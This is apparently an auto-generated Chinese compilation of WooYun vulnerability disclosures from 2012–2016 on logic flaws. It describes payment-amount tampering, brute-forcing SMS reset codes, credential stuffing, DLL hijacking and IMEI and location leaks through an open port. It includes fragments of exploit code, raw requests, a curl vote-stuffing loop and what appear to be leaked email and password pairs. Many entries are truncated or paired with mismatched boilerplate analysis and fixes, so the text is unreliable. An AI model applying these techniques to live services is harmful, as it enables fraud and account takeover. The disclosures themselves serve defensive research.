**POC**: 1.客户端基本信息：下载地址：http://**.**.**.**/helppage/downApp/jrAppPromote.htmlapk  : com.jd.jrapp, 37, 3.1.1, 某电商平台金融apkmd5: 4e9f3114a966c3232d8d0464de663c3a证书 :certmd5: b935fa89dae69096f5cec00045e3daacissuer: C=0086, ST=china, L=Beijing, O=某电商平台金融, OU=某电商平台, CN=金融subject: C=0086, ST=china, L=Beijing, O=某电商平台金融, OU=某电商平台, C

**绕过**: 直接利用

**修复**: 客户端版本信息可做加密处理。使用安全的传输协议，如https。
---

---
### [wooyun-2013-047474] 某搜索引擎Android端某应用存在帐号密码挖掘端口
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎输入法安卓客户端登录处风控机制不合理，可免验证码无限尝试用户密码。（例如版本V4.0.5.20）且该端口未发现任何风控机制。

**POC**: 该端口部分抓包数据。user为用户名，pass为密码（加密方式同某搜索引擎其他应用，这里不公开了）。该端口无验证码机制和帐号冻结机制，某些用户可以轻松利用该端口制作软件，达到大量挖掘用户弱密码盗取帐号的目的。

**绕过**: 直接利用

**修复**: 当某一帐号短时间内密码被多次尝试，暂时予以冻结。
---

---
### [wooyun-2013-020182] 小木虫论坛支付漏洞
**厂商**: 小木虫论坛（https://example.com/[已脱敏] | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址https://example.com/[已脱敏]

**POC**: 逻辑漏洞，给下载页面加验证。

**绕过**: 直接利用

**修复**: 逻辑漏洞，给下载页面加验证。
---

---
### [wooyun-2013-040861] 蜘蛛网支付漏洞 2元购买价值12000购物卡
**厂商**: 蜘蛛网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先找一个商品点击购买  抓包因为实验过几次，图片可能不匹配实际 修改运费或者会员折扣的参数修改成功 用网银支付

**POC**: 支付成功

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2015-0129912] 某搜索引擎某SDK设计缺陷导致手机敏感信息泄露(IMEI号和地理位置信息等)
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 漏洞定位检测发现手机经常有应用会打开7777端口，并且在任意地址监听，于是便一探究竟。原来是某搜索引擎手机助手（当前最新版）。然而直接在apk逆向后的代码中搜索7777或其16进制表示0x1e61却一无所获。最后发现手机助手apk是在运行的时候动态加载的plugin-deploy.dex打开了该端口。根据线索，发现com.baidu.frontia.FrontiaApplication类对安装包中的plugin.dex解密后动态加载。安装某搜索引擎手机助手，对应用目录下的plugin.dex进行分析，该文件实际是一个odex文件，需要按如下步骤转换为dexadb pull /data/data/com.baidu.appsearch/app_push_dex/plugin-deploy.dexadb pull /system/framework/java -jar ~/tools/smali

**POC**: 0x03 漏洞证明对于某搜索引擎手机助手:远程获取手机的IMEI对于熊猫驾信:远程获取手机的地理位置信息上述漏洞也可以本地在127.0.0.1利用，使得本不具备android.permission.READ_PHONE_STATE和android.permission.ACCESS_FINE_LOCATION权限的本地应用读取IMEI和地理位置信息。利用手机的热点功能，在3G/4G内网内扫描，可以批量获取手机的IMEI和地理位置信息，发现许多主机都打开了7777端口。扫描一个C段的结果这样就可以用来追踪某些手机所处的地理位置（需要同时支持geolocation和getcuid接口）试验中也发现，许多

**绕过**: 直接利用

**修复**: 1、不要在任意地址监听7777端口。2、如果只在本地地址监听，仍然属于一个漏洞，但风险较低，如何修复取决于如何取舍SDK的功能，你们更专业。
---

---
### [wooyun-2015-0105560] 大部分国产移动浏览器厂商存在同一种设计缺陷
**厂商**: cert | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 事先说明，需要做2个准备。准备1，注册个和你攻击目标比较接近的域名，譬如163.com，你可以去随意注册一个域名，然后开通一个多级域名163.com.system.xxx等等类似。准备2，编辑网页，将title部分设置为：<title>某互联网公司安全中心-找回密码</title>这里以某互联网公司安全中心为例，访问自己构造好的网页，可以看到实际上地址栏部分被更改为了某互联网公司安全中心。国产浏览器大部分受到影响。傲游浏览器：uc浏览器：猎豹浏览器：某浏览器：搜狗浏览器：全部统一把title部分解析到了url的地方。除了上面的以外，还有360浏览器，2345浏览器等等。不一一截图了。

**POC**: 再来看看本身自带的safari浏览器以及chrome是怎么做处理的：再附上zone里头一个白帽子差点被这样技术给骗了的案例：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: url地址栏就显示url，标题不要打印出来，很容易让人误导。各司其职。
---

---
### [wooyun-2015-0158046] 广汽集团某内部系统设计逻辑缺陷敏感信息泄露
**厂商**: 广汽集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/无验证码，手动测试工号为6位数burp一下，用简单密码123456302均为成功用户，很多，举个例子登录包含多个后台

**POC**: 报账系统合同系统

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2014-072281] 微爱APP锁屏密码简单绕过
**厂商**: 北京发现角科技有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0102650] 情人节再也不用担心买不起花了（某卖花网站支付漏洞）
**厂商**: 订花人 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /orderfast_pay_do.asp HTTP/1.1Host: www.dinghuaren.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏] ASPSESSIONIDSCC

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个测试订单先取消了吧～嘿嘿，如果能送最好了，求高rank～
---

---
### [wooyun-2013-018982] 某社交平台某社交平台登录逻辑漏洞导致密码hash成为明文密码
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 研究了下某社交平台登陆：1，没用https，2，用如下算法加密：SHA1(SHA1(SHA1(password))+servertime+nonc)，3，servertime和nonc由prelogin.php从服务端颁发。某社交平台采用这样方式的动机应该是：1，http性能好又方便，https部署麻烦，支持多终端不方便。所以选择http作为认证协议。2，基于#1的决策，为了防止网络嗅探用户被盗用密码，所以在js中 SHA1(password)，一层不放心，做两层：SHA1(SHA1(password))3，为了防止用户弱口令，加上salt4，为了防止暴力破解，采用salt服务器端颁发的方式基于#1，2，3，4的逻辑链，产生了现在的登录流程和密码加密算法。这样做的隐患是：基于现在的逻辑，某社交平台后端user表中的password只能存储SHA1(password)或者SHA1(SHA1(password)

**POC**: 下图为某社交平台前端js中的password加密部分

**绕过**: 直接利用

**修复**: 1，启用https，必须的。2，取消js加密算法
---

---
### [wooyun-2015-0112258] 中国国旅一元买任意张数旅游票(支付逻辑漏洞)
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国国旅买票的时候可以通过burp抓包，修改金额和人数，提交过后可以用一元买N张票以下是详细修改数据提交过后的截图，burp忘了截图了，你们自己可以试下行不行：

**POC**: adultNum和childNum对应成人和小孩数目，可以修改为任意数值。抓到数据后把金额全都修改成1块，提交后：

**绕过**: 直接利用

**修复**: 你们懂得。望注意下安全，测试的时候身份证、游客名随便填都行~乌云虐我千百遍，我待乌云如初恋。再次求邀请码：）
---

---
### [wooyun-2014-061571] 某社交空间Android版逻辑缺陷导致隐私泄漏
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交空间Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取

**POC**: import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.Intent;public class MainActivity extends Activity {public final static String MY_PKG ="com.example.testqzone";public final static String MY_TMP_DIR ="/data/data/" + MY_PKG + "/tmp/";public final static

**绕过**: 直接利用

**修复**: 对符号链接进行限制
---

---
### [wooyun-2016-0171185] 搜狗云测平台找回密码功设计不当可任意重置他人密码
**厂商**: 搜狗 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一共犯错了3个错误：第一：验证码是简短的4位纯数字，造成猜解时间段。第二：验证码没有错误次数限制，导致可暴力破解。第三：验证码没有发送次数上限，已知可对手机短信轰炸。此次问题主要是前两点，一分钟之内可任意重置他人密码。输入手机号码，点击获取短信验证码，填写新密码后点击重置密码，抓包它的短信验证码是4位数字，我从1000开始暴力破解可以看到这一行返回数据长度与其它地方不一样，payload值2234就是我们的短信验证码此时密码已经被重置为7777777OK! 登陆成功！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 第一：加大验证码复杂度，建议6位数字和字母混合。第二：限制重试次数，同一手机号验证码错误次数3次后，当前验证码失效，需要重新获取。第三：限制获取次数，每个手机号一天中获取验证码次数不超过3次。
---

---
### [wooyun-2012-011531] gsm sniffing可嗅探短信
**厂商**: 移动,联通 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0149109] 首汽约车某处设计逻辑缺陷任意账号密码重置
**厂商**: 首汽约车 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网下个APP走找回密码流程，13333333333验证码四位长，无限制重置密码接口验证码经过base64编码整一份base64编码的4位数字字典开始跑起来结果登陆验证13333333333 123456

**POC**: 如上

**绕过**: 编码绕过

**修复**: 加强验证
---

---
### [wooyun-2015-0144219] 好车主APP购买车险功能存在漏洞金额可任意修改
**厂商**: pahaoche.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某车险APP应用在购买车险时可修改支付金额购买成功。

**POC**: step1. 提交正常的支付请求，数据中包含支付金额：step2. 修改支付金额：step3. 支付成功：

**绕过**: 直接利用

**修复**: 建议对支付数据进行加密处理后再进行传输。
---

---
### [wooyun-2015-0100150] UC浏览器下载功能未限制同源可造成RFD攻击
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在浏览器模式下打开https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这样这个漏洞形成的原因就很简明了，要符合几个条件：1.在返回中能看到我们的输入并且content-type的类型不是普通类型，json或者jsonp等等。。。2.url没有过滤或转义‘/’‘;’3.是下载类型。使用不完整的Content-Disposition:attachment或者是不符合htt
---

---
### [wooyun-2015-0160365] 东华协同办公平台设计逻辑缺陷导致资料泄露
**厂商**: 东华协同办公平台 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台http://**.**.**.**/ylxt/简单密码太多了chenchao 123456lilei 123456wangfeng 123456lijianjun 123456各种内部资料泄露

**POC**: 似乎头像处还可上传getshell。。。本着不做破坏的原则就没试。。

**绕过**: 直接利用

**修复**: 验证码~密码强度管理~你们更专业
---

---
### [wooyun-2014-074213] Huawei MT2 温控系统设计缺陷
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Huawei MT2 手机使用[Generic Thermal sysfs driver]对设备进行温度监控，该驱动提对设备温度实时监控的功能，当指定监控设备达到温度设定值时底层进程会通过执行相应配置参数来降低设备温度，通常的方式为限制CPU或GPU频率等等,从而可以防止手机过热而损害某些部件的风险。Huawei MT2 手机底层守护进程为: /system/bin/thermalmMT2厂商配置文件:sampling 5000[systemh]sampling 1000thresholds 43 46 50 64thresholds_clr 41 44 47 58actions app+ucurrent+bcurrent+cpu+gpu ucurrent+bcurrent+cpu+gpu cpu+gpu shutdownaction_info 1+900+512+0+0 900+256+

**POC**: 测试代码:测试手机: Huawei MT2ROM版本: MT2-L05V100R001C17B111Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE, null);startActivity(intent);使用以上代码将调用系统的自带相机功能，系统自带相机启动后大约在10-15秒(视环境温度而定)左右时间即会因为图像处理运算将手机温度逐渐提高至43℃，随后系统温度守护进程会因执行设计缺陷的mitigation功能导致系统相机崩溃。[备注:未测试其它某品牌手机，如果使用同样配置文件可能有相同的问题]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0144920] 习网蜂蜜果商城任意商品购买（蜂蜜果无限获取）
**厂商**: 习网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 换个三国杀吧，挺经典的burp把response拦下来，之后会用js判断蜂蜜果是否够，把这里改大一点，然后兑换提交订单，把请求拦下来，把count参数改成负值提交，成功加了4000，接下来就能正常兑换了吧XD

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 提交订单的时候要判断数量。祝好
---

---
### [wooyun-2014-083685] 前程无忧51job某处逻辑漏洞导致用户密码泄漏（极少量用户）
**厂商**: 前程无忧(51job) | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用方式：inurl:?../passport_loginname=问题参数获得密码：注意看随便打开1个页面尝试记录密码https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 逻辑参数
---

---
### [wooyun-2015-0151344] 某高校网银收费系统设计逻辑缺陷可导致学生信息泄漏
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该平台使用学号作为用户名及密码，并不提供修改密码的方式。导致能获取任意学号的个人信息。**.**.**.**/wsjf/用户名及密码均为学号，登陆后可查看学生详细信息。并且不提供修改密码的方式！

**POC**: 按照学号的组成方式任意构造学号。（学年 ＋ 学院代码 ＋ 专业代码 ＋ 班级 ＋ 号码）如 1203010101  ， 即可正常登录登陆后即可查看学生信息缴费记录缴费记录详情如欠费的话会有欠费记录和网银支付接口因为实在是找不到谁没交学费，所以没有图示。。。如果使用过该平台缴纳学费，还会在这里有记录同样是没找到案例虽然该网站的登录需要输入验证码，但是目测自动识别率100%，形同虚设因此毫无疑问可以用脚本批量采集学生信息，造成严重后果关键是，还！不！让！改！密！码！

**绕过**: 直接利用

**修复**: 最总要的就是提供修改密码的方法以及不要这么弱的密码
---

---
### [wooyun-2014-081109] 某互联网公司某业务逻辑控制不严可导致用户在不知情的情况下账号被盗(影响聊天、空间、某社交平台、邮箱等全线业务)
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.问题起因，sid这个参数，某互联网公司很多业务都使用sid单个参数做用户识别，然后还都是get请求，这种模式对于现在的网络安全环境来说，有点2了，而且请求过程也都是非加密的，抓取到通信即可获取，sid的有效期我发现也特别长，即使同一某互联网公司生成多组sid也均会有效，那么下面问题来了？举个例子：(例子来自于搜索引擎抓取到的sid，无需密码即可使用全线业务，真变态，原来还真不知道)site:vip.某域名.com inurl:sid=site:某域名.com inurl:card/index inurl:sid=site:mc.vip.某域名.com inurl:sid=site:某域名.com inurl:sid=A还有很多搜索方法，搜索引擎很给力吖有效的sid是24位，都是A开头的，可以从搜索引擎里找到相当一部分有效的。而且搜索引擎抓取的时间都是几个月前，那也就是说sid的有效时间很长，但是有个情况，就是

**POC**: 2.某互联网公司业务列表：(下面的sid均来自搜索引擎，当你测试的时候不见的都有效)https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 肯定懂得修复，就看你们想怎么处理了
---

---
### [wooyun-2015-0109312] 机锋某接口撞库泄露用户登录凭据(有批量账号证明)
**厂商**: 机锋网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号主站登陆验证码绕过。验证码只在之前的一步有验证，最后登录的时候没有验证。。这逻辑写的。。。登录数据包如下：POST /doLogin HTTP/1.1Host: my.gfan.comProxy-Connection: keep-aliveContent-Length: 108Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit

**POC**: 经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.目前互联网上公开的账号都有数亿的规模，真要被利用的话危害还是很大的。lyyarq@yeah.net	429131222wtzjw1112@某邮箱.com	wtzjw885281112zqdzly@tom.com	12345678ls1277@某域名.com	19880818360412641@某互联网公司.COM	90281972375971709@某域名.com	83030545gwxarc@hotmail.com	072324aaynliliang@gmail.com	liliangSlp2433@某域名.com	369258174zhaox

**绕过**: 过滤绕过

**修复**: 撞库防御参考资料:https://example.com/[已脱敏]
---

---
### [wooyun-2013-036687] 联众世界游戏大厅两处DLL劫持
**厂商**: 联众世界 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 联众世界游戏大厅默认安装路径：C:\Program Files\GlobalLink\Game\Share具体利用方法：GLWorld.exe运行时会加载同目录下两个个不存在的DLL文件glhgstart.dll和idframe.dll，只要自己写一个dll与GLWorld.exe放在同一目录，这样就可以在运行GLWorld.exe的时候会同时加载glhgstart.dll或idframe.dll，这个dll可以为自制的任意内容的dll。此方法可用于劫持启动木马病毒。（我这里放入特定的名为glhgstart.dll的文件，运行GLWorld.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2015-0125060] 某外卖平台逻辑漏洞之免费吃喝不是梦
**厂商**: 某外卖平台 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 自认为思路还是屌屌的，没见过类似的漏洞啊，能打雷么~问题是在某外卖平台早餐的地方，某外卖平台早餐真心方便啊早餐最近出了个活动，可以领10元抵用券输入信息后，领取成功这一步其实是收集信息，后面的一个请求才是真的申领红包抵用券的请求测试发现，一个手机号只能领2个红包于是就开始fuzz1）正常情况，只能2次，无法多次获取红包{"flag":2,"phoneNo":"18xxxxxxx33"}{"status":"ERROR","data":null,"message":"该用户最多只能领取2次"}2）测试是否仅对phoneNo做校验，在手机号后面加字母测试{"flag":2,"phoneNo":"18xxxxxxx33ff"}{"status":"SUCCESS","data":"获取成功","message":null}是可以发送成功的，只是因为手机号错误的原因，我们收不到短信3）那么思路就来了，只要

**POC**: 总结一下正常情况可以成功{"flag":2,"phoneNo":"18xxxxxxx33"}手机号前面加86可以成功{"flag":2,"phoneNo":"8618xxxxxxx33"}短号，小号，可以转发短信的。例如某虚拟号码，亲情小号等{"flag":2,"phoneNo":"13216994045！"}分号分隔可以成功，可无限获取红包{"flag":2,"phoneNo":"18xxxxxxx33,138xxxxxxx"}3天的早餐只要5毛钱，给某外卖平台点个赞啊

**绕过**: 过滤绕过

**修复**: phoneNo的值要经过提纯再进入短信发送平台进行发送
---

---
### [wooyun-2012-05285] 2012洛阳首届胸模大赛投票系统刷票漏洞
**厂商**: 洛阳网 https://example.com/[已脱敏] | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #!/bin/bash# author @十三乙# vote for https://example.com/[已脱敏] https://example.com/[已脱敏]"https://example.com/[已脱敏]";USER_AGENT="Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/[IP已脱敏] Safari/535.11";while true;doFAKEIP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"curl -X POST -H "X-Forwarded-For:$FAKEI

**POC**: @李铁根 ： 越是身处喧嚣迷乱的尘世，越要坚持真实的自己。在这个去伪存真的日子，伸出你有爱的双手，帮忙在洛阳首届胸模大赛中投康艳艳一票吧。https://example.com/[已脱敏] author @十三乙# vote for https://example.com/[已脱敏] https://example.com/[已脱敏]"https://example.com/[已脱敏]";USER_AGENT="Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1

**绕过**: 直接利用

**修复**: 验证码绕过：初始化session中的验证码、处理post请求时判断验证码是否为空。IP绕过：综合RemoteAddress和XFF判断是否重复投票。可参考： 浅谈新形势下在线Web投票系统的攻防(1)/(2)× https://example.com/[已脱敏]
---

---
### [wooyun-2014-058230] 美丽说任意商品0元购
**厂商**: 美丽说 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美丽说任意商品0元购逻辑漏洞导致任意商品的数量可以为负数，且可以修改用户提交订单的价格，导致我们提交的订单可以任意修改过程如下：客户端修改订单的数量用burp suite修改客户端的数量，也可在提交订单时修改价格在提交时虽然提交失败，其实订单已经生成了提交成功的订单即使服务器会对提交的负数进行判断，但是我们可以买一件贵的商品和一个便宜的商品(便宜的商品设为负值）从而生成的订单价格为正数，也可以修改price的值为一个小的正数，从而完成我们的付款。既可以购买任意商品。

**POC**: 提交成功的订单

**绕过**: 直接利用

**修复**: 提交的数量不能为0，为负，在服务端对提交的变量进行绝对值函数即可对于提交的每个商品的price不要从客户端获得值
---

---
### [wooyun-2014-075696] 皮书数据库某业务逻辑设计存在缺陷
**厂商**: ssap.com.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、电子版报告下载链接存在设计缺陷，在已登录的情况下，可以绕过订单支付直接下载任意报告。2、报告信息展示页面的contentId参数https://example.com/[已脱敏]

**POC**: 1、报告信息展示页面https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 建议电子文档下载与订单支付业务进行关联
---

---
### [wooyun-2015-0144052] P2P安全之美利金融可某功能存在逻辑缺陷
**厂商**: 美利金融 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册的手机卡丢了，哎呀，这可咋办呢莫慌，经过查看，网站存在缺陷可绕过原手机号码验证修改账户绑定手机首先我们登陆账号 图片是我的原手机号然后我们去点修改绑定手机  在修改那步 打开浏览器开发模式利用审核元素修改要发送的手机号码再点发送 这样网站发送号码就已经改变了 直接发送到我们能接收短信的手机号上再然后收到短信后我们去绑定新手机号码绑定成功的图好了，丢了卡也不用着急，完美跳过！

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 增加验证机制！
---

---
### [wooyun-2015-0150443] 某搜索引擎贴吧安卓版升级漏洞
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过service的名字可以看出这个是tieba的更新服务，而且该服务可以由外部程序访问。该服务的onStart函数，可以非常明显的看到url是可以控制的。this.mMainApkUrl = arg4.getStringExtra("key_tieba_apk_url");就是上面这行代码，可以传入自己想要的安装的apk的url。然后是我的测试代码，我将url指向了豌豆荚下的天天消消乐。。。。Intent intent_2 = new Intent();intent_2.setComponent(new ComponentName("com.baidu.tieba", "com.baidu.tieba.service.TiebaUpdateService"));intent_2.putExtra("key_tieba_apk_url", "http://**.**.**.**/apps/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改该组件的exported为false，或者将更新的URL固定。
---

---
### [wooyun-2014-074193] 波克城市验证码绕过，验证码安全形同虚设
**厂商**: 波克城市 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

